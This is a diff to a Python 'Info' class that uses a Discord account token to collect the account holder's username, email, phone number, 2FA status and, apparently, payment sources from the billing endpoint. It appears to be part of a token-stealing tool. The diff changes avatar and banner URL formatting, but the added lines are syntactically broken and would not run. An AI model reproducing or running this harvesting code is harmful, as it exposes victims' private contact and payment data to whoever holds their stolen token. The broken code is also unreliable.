@@ -59,8 +59,8 @@ class Info:
             User Name: {userName}
             User ID: {userID}
             Bio: {bio}
-            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.png" if not avatar == "Default" else avatar}
-            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.png" if not avatar == "Default" else banner}
+            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.{'gif' if avatar.startswith("a_" else 'png')}" if not avatar == "Default" else avatar}
+            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.{'gif' if banner.startswith("a_" else 'png'}" if not banner == "Default" else banner}
             Banner color: {banner_color}
             Locale: {locale}
             NSFW allowed? {nsfw}
@@ -143,21 +143,21 @@ class Info:
                                 nsfw = r.json()["nsfw_allowed"]
                                 verif = r.json()["verified"]
                                 info.append(
-                                    f"""\n
-    User Name: {userName}
-    User ID: {userID}
-    Bio: {bio}
-    Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.png" if not avatar == "Default" else avatar}
-    Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.png" if not banner == "Default" else banner}
-    Banner color: {banner_color}
-    Locale: {locale}
-    NSFW allowed? {nsfw}
-    2 Factor: {mfa}
-    Email: {email}
-    Verified? {verif}
-    Phone Number: {phone if phone else 'None.'}
-                                """
-                                )
+                            f"""\n
+            User Name: {userName}
+            User ID: {userID}
+            Bio: {bio}
+            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.{'gif' if avatar.startswith("a_" else 'png')}" if not avatar == "Default" else avatar}
+            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.{'gif' if banner.startswith("a_" else 'png'}" if not banner == "Default" else banner}
+            Banner color: {banner_color}
+            Locale: {locale}
+            NSFW allowed? {nsfw}
+            2 Factor: {mfa}
+            Email: {email}
+            Verified? {verif}
+            Phone Number: {phone if phone else 'None.'}
+                        """
+                        )
                                 req = get(
                                     "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                     headers={"Authorization": token},
